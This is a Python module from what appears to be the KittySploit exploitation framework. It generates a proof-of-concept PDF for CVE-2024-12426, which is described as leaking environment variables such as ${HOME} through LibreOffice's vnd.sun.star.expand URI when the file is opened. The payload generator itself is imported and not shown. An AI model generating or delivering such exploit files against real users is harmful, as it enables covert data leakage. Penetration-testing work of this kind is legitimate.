#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.viewer_cve import write_libreoffice_expand_uri


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2024-12426 LibreOffice Expand URI',
        "description": 'Generate PDF PoC for CVE-2024-12426: vnd.sun.star.expand URI leaks environment variables (${HOME}) via LibreOffice on open.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2024-12426'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2024-12426'],
        "tags": ['pdf', 'cve-2024-12426', 'libreoffice', 'ssrf', 'env-leak'],
    }

    PDF_GENERATORS = (
        write_libreoffice_expand_uri,
    )

    CVE_IDS = ['CVE-2024-12426']
    MODULE_TITLE = 'PDF CVE-2024-12426 LibreOffice Expand URI'

    def run(self):
        return self.run_pdf_cve()